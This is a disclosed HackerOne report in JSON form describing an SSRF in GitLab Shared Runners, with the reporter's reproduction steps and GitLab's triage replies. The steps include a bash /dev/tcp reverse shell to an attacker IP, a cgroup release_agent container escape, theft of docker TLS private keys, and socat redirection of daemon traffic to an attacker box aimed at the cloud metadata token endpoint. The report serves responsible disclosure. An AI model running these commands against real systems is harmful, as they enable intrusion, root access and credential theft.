{"id":809248,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDkyNDg=","url":"https://hackerone.com/reports/809248","title":"SSRF into Shared Runner, by replacing dockerd with malicious server in Executor","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-03-03T05:15:48.530Z","submitted_at":"2020-03-03T05:15:48.530Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lucash-dev","url":"/lucash-dev","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-08T13:28:39.515Z","bug_reporter_agreed_on_going_public_at":"2020-08-10T20:12:45.207Z","team_member_agreed_on_going_public_at":"2020-09-08T13:28:39.323Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Note\n\nI've assigned the severity HIGH and submitted this report based on previously disclosed blind SSRF bugs that were previously disclosed.\n(https://hackerone.com/reports/398799)\nIf that's not correct, please adjust or let me know if you require more immediate impact on users in order to consider it.\n\n\n# Description\n\nThe Shared Runners implementation has a bug in its docker client\nthat allows following HTTP redirection. Because it accesses the\ndocker daemons running in executors -- which are completely under\ncontrol of users -- a malicious user can replace the existing\ndockerd with a malicious HTTPS server that sends redirect responses.\nThe TLS validation can't prevent this attack, as both public and\nprivate keys used by the docker daemon in the executor are also\nunder the CI job's (so the user's) control.\n\nAn attacker can use that to perform (mostly blind) SSRF attacks\ntargetting the Shared Runner local host, link-local and local networks.\nIn case of an error response from the target, the response body\nwill be displayed in the CI job's logs.\nA succcessful HTTP request will result in the first character of\nthe response being visible, or -- if the response is a valid JSON --\nwill cause the process to hang.\nTCP (other than HTTP) targets also partially reveal the response.\n\nThis can be used, for example to send requests to Google Cloud's metadata\nservice, but so far I've been unable to obtain the access token\n(only the first character `a` is visible).\n\nThe culprit seems to be \n`https://gitlab.com/gitlab-org/gitlab-runner/-/blob/master/helpers/docker/official_docker_client.go#L45`\n\nThe line `httpClient := \u0026http.Client{Transport: transport}` seems to be missing a proper\nredirect policy.\n\n\n# Steps to reproduce\n\nThere are a number of steps to reproduce this issue the way I did.\nMost of them could be automated or simplified with further effort, but I think\nthe existing process can be followed relatively easily. Please let me know if you \nhave trouble with it.\n\n1 - Run a CI job and obtain a reverse shell into the Executor\n\nCreate a CI jobs that runs a command like \n```\nbash -i \u003e\u0026 /dev/tcp/1.2.3.4/4444 0\u003e\u00261\n```\n\nReplace the IP address with the address of an external machine you control.\n\nUse `nc -lvp 4444` to obtain the reverse shell from your machine.\n\n2 - Prepare root access to the Executor and mount host file system\n\nIn the shell, run the following commands:\n\n```\nmkdir /h ;\nmount /dev/sda9 /h;\nmkdir /tmp/cgrp \u0026\u0026 mount -t cgroup -o memory cgroup /tmp/cgrp \u0026\u0026 mkdir /tmp/cgrp/x;\necho 1 \u003e /tmp/cgrp/x/notify_on_release;\nexport host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`;\n echo \"$host_path/cmd\" \u003e /tmp/cgrp/release_agent;\n```\n\nThis will both mount the host storage volume and prepare a cgroup trigger for running commands\nas root.\n\n3 - Obtain docker's certificate public and private keys\n\nRun these commands:\n\n```\ncat /h/etc/docker/server.pem\ncat /h/etc/docker/server-key.pem\n```\n\n4 - Set up a malicious HTTPS server in a machine you control\n\nCopy the text of `server.pem` and `server-key.pem` to the corresponding files in your attacker\nmachine.\n\nRun the attached `maliciousHttpsServer.py`.\n\nThis will start an HTTPS server that uses the certs in the provided `server.pem` and `server-key.pem`\nfiles. That way the Runner docker client has no way to tell it from the legitimate `dockerd`.\n\n\n5 - Obtain the PID that's listening to port 2376 (docker daemon)\n\nRun the following commands:\n```\necho '#!/bin/sh' \u003e /cmd\necho \"sudo netstat -tanp \u003e $host_path/n2\" \u003e\u003e /cmd\nchmod a+x /cmd\n  sh -c \"echo \\$\\$ \u003e /tmp/cgrp/x/cgroup.procs\"\ncat /n2\n```\n\nTake note of the PID listening to 2376.\n\n\n6 - Kill the daemon and use `socat` to redirect IP packets to your\nexternal machine.\n\nNow we must send the traffic from the Executor to our attack box:\n\n```\necho '#!/bin/sh' \u003e /cmd\necho \"sudo kill -9 999 \u0026\u0026 socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2\u003e $host_path/k2\" \u003e\u003e /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ \u003e /tmp/cgrp/x/cgroup.procs\"\n```\nReplace `999` with the correct PID, and `1.2.3.4` with the IP of your attack box.\n\n7 - The external HTTPS now will redirect the Runner's Docker Client's\nrequests to the target.\n\nNow the connection flow we have is this\n\n```\n[Runner-client] --TLS--\u003e [Executor] --Socat--\u003e [Malicious-HTTPS-server] --Redirect--\u003e [Runner-client] --HTTP--\u003e Target\n\n```\n\nThe `maliciousHttpServer.py` script is configured to redirect GET requests to\n`http://metadata.google.internal:80/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text\n\n(BTW the `v1beta1` endpoint is still working)\n\nThe same technique can be used to obtain SSRF with POST and DELETE requests.\n\n8 - Observe the response in the job's error logs.\n\nNow the Shared Runner will try to keep track of the running job, but it's HTTP requests\nwill end up hitting the metadata endpoint, so the response won't be valid.\nThe first letter of the response (`a` for `access_Token`) will show up in an error message\nwhen it's trying to parse the response.\n\n\n\n# What is the expected behavior\n\nThe Runner's docker client shouldn't trust the docker daemon, and\nshouldn't follow redirections from the docker REST API, much less\nredirections to local addresses.\n\n# What is the actual bug behavior\n\nThe Runner's docker client follows redirect responses sent by\nthe executor's docker daemon. \n\n\n# Impact\n\nThe issue described here allows an attacker to hit local host, local network, and link-local\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\nendpoints.\nThe request response can be partially obtained in case of a successful request, or completely\nobtained in case of an error response code.\n\nSince the Share Runners are shared between different projects/users and command the CI jobs\nfor these, the issue seems relevant.\n\nOther impacts that might be possibly obtained (though not tested as might cause disruption of\nservice) include:\n- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\n- Resource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\n\nI'm still actively researching ways of obtaining the full HTTP response, as well as other\ntarget endpoints, and will report in the comments further findings.\n\n## Impact\n\n# Impact\n\nThe issue described here allows an attacker to hit local host, local network, and link-local\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\nendpoints.\nThe request response can be partially obtained in case of a successful request, or completely\nobtained in case of an error response code.\n\nSince the Share Runners are shared between different projects/users and command the CI jobs\nfor these, the issue seems relevant.\n\nOther impacts that might be possibly obtained (though not tested as might cause disruption of\nservice) include:\n- Resource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\n- Resource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\n\nI'm still actively researching ways of obtaining the full HTTP response, as well as other\ntarget endpoints, and will report in the comments further findings.","vulnerability_information_html":"\u003ch1 id=\"note\"\u003eNote\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;ve assigned the severity HIGH and submitted this report based on previously disclosed blind SSRF bugs that were previously disclosed.\u003cbr\u003e\n(\u003ca title=\"https://hackerone.com/reports/398799\" href=\"https://hackerone.com/reports/398799\"\u003ehttps://hackerone.com/reports/398799\u003c/a\u003e)\u003cbr\u003e\nIf that\u0026#39;s not correct, please adjust or let me know if you require more immediate impact on users in order to consider it.\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThe Shared Runners implementation has a bug in its docker client\u003cbr\u003e\nthat allows following HTTP redirection. Because it accesses the\u003cbr\u003e\ndocker daemons running in executors -- which are completely under\u003cbr\u003e\ncontrol of users -- a malicious user can replace the existing\u003cbr\u003e\ndockerd with a malicious HTTPS server that sends redirect responses.\u003cbr\u003e\nThe TLS validation can\u0026#39;t prevent this attack, as both public and\u003cbr\u003e\nprivate keys used by the docker daemon in the executor are also\u003cbr\u003e\nunder the CI job\u0026#39;s (so the user\u0026#39;s) control.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can use that to perform (mostly blind) SSRF attacks\u003cbr\u003e\ntargetting the Shared Runner local host, link-local and local networks.\u003cbr\u003e\nIn case of an error response from the target, the response body\u003cbr\u003e\nwill be displayed in the CI job\u0026#39;s logs.\u003cbr\u003e\nA succcessful HTTP request will result in the first character of\u003cbr\u003e\nthe response being visible, or -- if the response is a valid JSON --\u003cbr\u003e\nwill cause the process to hang.\u003cbr\u003e\nTCP (other than HTTP) targets also partially reveal the response.\u003c/p\u003e\n\n\u003cp\u003eThis can be used, for example to send requests to Google Cloud\u0026#39;s metadata\u003cbr\u003e\nservice, but so far I\u0026#39;ve been unable to obtain the access token\u003cbr\u003e\n(only the first character \u003ccode\u003ea\u003c/code\u003e is visible).\u003c/p\u003e\n\n\u003cp\u003eThe culprit seems to be \u003cbr\u003e\n\u003ccode\u003ehttps://gitlab.com/gitlab-org/gitlab-runner/-/blob/master/helpers/docker/official_docker_client.go#L45\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe line \u003ccode\u003ehttpClient := \u0026amp;http.Client{Transport: transport}\u003c/code\u003e seems to be missing a proper\u003cbr\u003e\nredirect policy.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003cp\u003eThere are a number of steps to reproduce this issue the way I did.\u003cbr\u003e\nMost of them could be automated or simplified with further effort, but I think\u003cbr\u003e\nthe existing process can be followed relatively easily. Please let me know if you \u003cbr\u003e\nhave trouble with it.\u003c/p\u003e\n\n\u003cp\u003e1 - Run a CI job and obtain a reverse shell into the Executor\u003c/p\u003e\n\n\u003cp\u003eCreate a CI jobs that runs a command like \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/1.2.3.4/4444 0\u0026gt;\u0026amp;1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eReplace the IP address with the address of an external machine you control.\u003c/p\u003e\n\n\u003cp\u003eUse \u003ccode\u003enc -lvp 4444\u003c/code\u003e to obtain the reverse shell from your machine.\u003c/p\u003e\n\n\u003cp\u003e2 - Prepare root access to the Executor and mount host file system\u003c/p\u003e\n\n\u003cp\u003eIn the shell, run the following commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emkdir /h ;\nmount /dev/sda9 /h;\nmkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o memory cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x;\necho 1 \u0026gt; /tmp/cgrp/x/notify_on_release;\nexport host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab`;\n echo \u0026quot;$host_path/cmd\u0026quot; \u0026gt; /tmp/cgrp/release_agent;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will both mount the host storage volume and prepare a cgroup trigger for running commands\u003cbr\u003e\nas root.\u003c/p\u003e\n\n\u003cp\u003e3 - Obtain docker\u0026#39;s certificate public and private keys\u003c/p\u003e\n\n\u003cp\u003eRun these commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecat /h/etc/docker/server.pem\ncat /h/etc/docker/server-key.pem\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e4 - Set up a malicious HTTPS server in a machine you control\u003c/p\u003e\n\n\u003cp\u003eCopy the text of \u003ccode\u003eserver.pem\u003c/code\u003e and \u003ccode\u003eserver-key.pem\u003c/code\u003e to the corresponding files in your attacker\u003cbr\u003e\nmachine.\u003c/p\u003e\n\n\u003cp\u003eRun the attached \u003ccode\u003emaliciousHttpsServer.py\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThis will start an HTTPS server that uses the certs in the provided \u003ccode\u003eserver.pem\u003c/code\u003e and \u003ccode\u003eserver-key.pem\u003c/code\u003e\u003cbr\u003e\nfiles. That way the Runner docker client has no way to tell it from the legitimate \u003ccode\u003edockerd\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e5 - Obtain the PID that\u0026#39;s listening to port 2376 (docker daemon)\u003c/p\u003e\n\n\u003cp\u003eRun the following commands:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eecho \u0026#39;#!/bin/sh\u0026#39; \u0026gt; /cmd\necho \u0026quot;sudo netstat -tanp \u0026gt; $host_path/n2\u0026quot; \u0026gt;\u0026gt; /cmd\nchmod a+x /cmd\n  sh -c \u0026quot;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026quot;\ncat /n2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTake note of the PID listening to 2376.\u003c/p\u003e\n\n\u003cp\u003e6 - Kill the daemon and use \u003ccode\u003esocat\u003c/code\u003e to redirect IP packets to your\u003cbr\u003e\nexternal machine.\u003c/p\u003e\n\n\u003cp\u003eNow we must send the traffic from the Executor to our attack box:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eecho \u0026#39;#!/bin/sh\u0026#39; \u0026gt; /cmd\necho \u0026quot;sudo kill -9 999 \u0026amp;\u0026amp; socat tcp-listen:2376,reuseaddr,fork tcp:1.2.3.4:1111 2\u0026gt; $host_path/k2\u0026quot; \u0026gt;\u0026gt; /cmd\nchmod a+x /cmd\nsh -c \u0026quot;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eReplace \u003ccode\u003e999\u003c/code\u003e with the correct PID, and \u003ccode\u003e1.2.3.4\u003c/code\u003e with the IP of your attack box.\u003c/p\u003e\n\n\u003cp\u003e7 - The external HTTPS now will redirect the Runner\u0026#39;s Docker Client\u0026#39;s\u003cbr\u003e\nrequests to the target.\u003c/p\u003e\n\n\u003cp\u003eNow the connection flow we have is this\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[Runner-client] --TLS--\u0026gt; [Executor] --Socat--\u0026gt; [Malicious-HTTPS-server] --Redirect--\u0026gt; [Runner-client] --HTTP--\u0026gt; Target\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003emaliciousHttpServer.py\u003c/code\u003e script is configured to redirect GET requests to\u003cbr\u003e\n`\u003ca title=\"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text\" href=\"/redirect?url=http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1beta1%2Finstance%2Fservice-accounts%2Fdefault%2Ftoken%3Falt%3Dtext\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=text\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e(BTW the \u003ccode\u003ev1beta1\u003c/code\u003e endpoint is still working)\u003c/p\u003e\n\n\u003cp\u003eThe same technique can be used to obtain SSRF with POST and DELETE requests.\u003c/p\u003e\n\n\u003cp\u003e8 - Observe the response in the job\u0026#39;s error logs.\u003c/p\u003e\n\n\u003cp\u003eNow the Shared Runner will try to keep track of the running job, but it\u0026#39;s HTTP requests\u003cbr\u003e\nwill end up hitting the metadata endpoint, so the response won\u0026#39;t be valid.\u003cbr\u003e\nThe first letter of the response (\u003ccode\u003ea\u003c/code\u003e for \u003ccode\u003eaccess_Token\u003c/code\u003e) will show up in an error message\u003cbr\u003e\nwhen it\u0026#39;s trying to parse the response.\u003c/p\u003e\n\n\u003ch1 id=\"what-is-the-expected-behavior\"\u003eWhat is the expected behavior\u003c/h1\u003e\n\n\u003cp\u003eThe Runner\u0026#39;s docker client shouldn\u0026#39;t trust the docker daemon, and\u003cbr\u003e\nshouldn\u0026#39;t follow redirections from the docker REST API, much less\u003cbr\u003e\nredirections to local addresses.\u003c/p\u003e\n\n\u003ch1 id=\"what-is-the-actual-bug-behavior\"\u003eWhat is the actual bug behavior\u003c/h1\u003e\n\n\u003cp\u003eThe Runner\u0026#39;s docker client follows redirect responses sent by\u003cbr\u003e\nthe executor\u0026#39;s docker daemon. \u003c/p\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eThe issue described here allows an attacker to hit local host, local network, and link-local\u003cbr\u003e\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\u003cbr\u003e\nendpoints.\u003cbr\u003e\nThe request response can be partially obtained in case of a successful request, or completely\u003cbr\u003e\nobtained in case of an error response code.\u003c/p\u003e\n\n\u003cp\u003eSince the Share Runners are shared between different projects/users and command the CI jobs\u003cbr\u003e\nfor these, the issue seems relevant.\u003c/p\u003e\n\n\u003cp\u003eOther impacts that might be possibly obtained (though not tested as might cause disruption of\u003cbr\u003e\nservice) include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eResource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\u003c/li\u003e\n\u003cli\u003eResource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI\u0026#39;m still actively researching ways of obtaining the full HTTP response, as well as other\u003cbr\u003e\ntarget endpoints, and will report in the comments further findings.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eThe issue described here allows an attacker to hit local host, local network, and link-local\u003cbr\u003e\naddresses within the Shared Runner, with GET, POST, DELETE HTTP(S) requests to arbitrary\u003cbr\u003e\nendpoints.\u003cbr\u003e\nThe request response can be partially obtained in case of a successful request, or completely\u003cbr\u003e\nobtained in case of an error response code.\u003c/p\u003e\n\n\u003cp\u003eSince the Share Runners are shared between different projects/users and command the CI jobs\u003cbr\u003e\nfor these, the issue seems relevant.\u003c/p\u003e\n\n\u003cp\u003eOther impacts that might be possibly obtained (though not tested as might cause disruption of\u003cbr\u003e\nservice) include:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eResource exhaustion through hanging jobs (when the HTTP response is a valid JSON).\u003c/li\u003e\n\u003cli\u003eResource exhaustion by sending excessively large responses, in particular, using gzip\nencoding.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI\u0026#39;m still actively researching ways of obtaining the full HTTP response, as well as other\u003cbr\u003e\ntarget endpoints, and will report in the comments further findings.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":735091,"file_name":"maliciousHttpsServer.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2YJSameMWd27VVEjALhXjowN?response-content-disposition=attachment%3B%20filename%3D%22maliciousHttpsServer.py%22%3B%20filename%2A%3DUTF-8%27%27maliciousHttpsServer.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZJO3526D%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065644Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIvMo8EBz315uHyZU%2FDG0Huf%2BYKjgYY96exJvyGCLJ6QIgTS1mW%2Fy84%2BDNAkhNbJC8Lysp3409zBR1BXDeS%2BTYRyoqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDEH1nkH4bxOL%2FzZVaiqRAz36Ga68aNU0H93UvEuRIu3bWdCaX174NDGE9HjZ6%2FIGHIDSo8%2BrgJclDinDvb%2Bz5hmDmKwxsZWntb8C077ZNi40vSm3S2BX7TIgKs7OdhHPP26QN5RZDLBCOd0pFTN5ykSL4WFPtakUEHIG05D09oYImqFNistW6N3pBf2hsoRXecWNFI7qMU5wkBMwH2QMBKxqwWAWEAbH6%2Bm%2FxceXV1a8FnL9d8Uhq%2F2Q494%2BZl8MTPuGY7b8f24oQWse7cwMUzvDfqk5TkNfLVSGvrldYvDZ5%2BxCgwagxuwM5onXgbXJ4rRlwsCuZjULhImoKeNv96uim58dbOdKVASQ6GndH5Nrd3tU1KMMgE8wulU71dP4zkXeWt6gi59gtfTvslGO582avOHZUkGIulK7r7JD3t1kTj7U8QaLGPznBskRPSjpug5C4fTdunIrlWgxxYPRSkn61QPQIYfO5cT0HvlOlcuNwaVarnH6q4OXAnE%2BiCH6ODeGHFc%2FbpDT1S1H%2FhTwMOseCmH6rpa9zpdueGS1v945MK%2F9qv8FOusBHn%2BLyL3HJMADkT5J%2FQsL%2Bm415pbG%2FB7sn6BT00QcjPotU4hSnic44MJSPfUmiSKj6d9gLy1f6TEKMFDfJSsENQ%2FaA%2FcWdZKIurcEqINLaFCH7pBgplCMxWUAgnjBUSd4R3H7RrO8ZQbJ3mfz5fAyaFiog5eNoktqTPC5U6knr6J5p0BqQz3pjKkZdFIlUKqlFwECcnX15GzWTOONLY2H8vGW7f3Jzu30NgpDT7w1IP4BRoOJg0NZFk0VVeK%2BYFVc3To9CA8AHQuJZBmtD%2B3SdCh%2FxMl87xH6SWR8e4W2edgavCy2dBUw0YFKbw%3D%3D\u0026X-Amz-Signature=b56b5a67cb8232e33a22eb780a50bfdbeeb310a27a5ba2a2128cde73f26afc64","file_size":717,"type":"text/x-python"}],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["sultancad","base_64","mygf","hulkvision_","an40r1","extremepixel","ret2c","einsamerwolf"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7202453,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @lucash-dev,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report. We will investigate the issue as soon as possible.\u003cbr\u003e\nDue to our current workload, we will get back within 20 business days with an update.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from submitting your report or inquiring about its status through\u003cbr\u003e\nadditional channels, as this unnecessarily binds resources in the security team.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2020-03-03T06:05:54.423Z","updated_at":"2020-03-03T06:05:54.423Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7204376,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @lucash-dev ,\n\nThanks for your report!\nWhat type of executor are you using ?\nFrom what I understood, to do your different steps it requires to have already an access to the project repository with the appropriate rights ?\n\nThanks and best regards,\nVitor\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThanks for your report!\u003cbr\u003e\nWhat type of executor are you using ?\u003cbr\u003e\nFrom what I understood, to do your different steps it requires to have already an access to the project repository with the appropriate rights ?\u003c/p\u003e\n\n\u003cp\u003eThanks and best regards,\u003cbr\u003e\nVitor\u003cbr\u003e\nSecurity Team | GitLab Inc.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-03T10:38:26.889Z","updated_at":"2020-03-03T10:38:26.889Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7207248,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, Vitor.\n\nWhen you run a CI job in a project, with default configuration, a Shared Runner Manager (like `shared-runners-manager-4.gitlab.com`) will take your job, along with multiple other jobs.\nIt will then use another, isolated instance (which I'm calling the Executor, as per indications in source code) and connect to it through the Docker API, in order to run your job there isolated from other users. Your job will run there\nin a docker container in privileged mode -- so your job can have root access to the whole instance. That's a known fact.\n\nThis report is about a way of using that isolated instance to SSRF into the Shared Runner Manager which is shared among different users and projects.\n\nHope that makes things clearer. Please let me know if you need more info.\n\nThanks!","markdown_message":"\u003cp\u003eHi, Vitor.\u003c/p\u003e\n\n\u003cp\u003eWhen you run a CI job in a project, with default configuration, a Shared Runner Manager (like \u003ccode\u003eshared-runners-manager-4.gitlab.com\u003c/code\u003e) will take your job, along with multiple other jobs.\u003cbr\u003e\nIt will then use another, isolated instance (which I\u0026#39;m calling the Executor, as per indications in source code) and connect to it through the Docker API, in order to run your job there isolated from other users. Your job will run there\u003cbr\u003e\nin a docker container in privileged mode -- so your job can have root access to the whole instance. That\u0026#39;s a known fact.\u003c/p\u003e\n\n\u003cp\u003eThis report is about a way of using that isolated instance to SSRF into the Shared Runner Manager which is shared among different users and projects.\u003c/p\u003e\n\n\u003cp\u003eHope that makes things clearer. Please let me know if you need more info.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-03T15:38:10.469Z","updated_at":"2020-03-03T15:38:10.469Z","actor":{"username":"lucash-dev","cleared":true,"url":"/lucash-dev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/515/399/dd4a50c732c98417d7be59efa049e8c234259884_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7235823,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @lucash-dev ,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team. We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/issues/209096 and https://gitlab.com/gitlab-com/gl-infra/infra-report/issues/2. This issue will be made public 30 days following the release of a patch.\n\nHowever due to the impact and limitations of the current vulnerability we have assessed the severity to medium only. Given this severity, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/lucash-dev\"\u003e@lucash-dev\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThank you for submitting this report.\u003c/p\u003e\n\n\u003cp\u003eWe have verified this finding and have escalated to our engineering team. We will be tracking progress internally at \u003ca title=\"https://gitlab.com/gitlab-org/gitlab/issues/209096\" href=\"/redirect?url=https%3A%2F%2Fgitlab.com%2Fgitlab-org%2Fgitlab%2Fissues%2F209096\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gitlab.com/gitlab-org/gitlab/issues/209096\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca 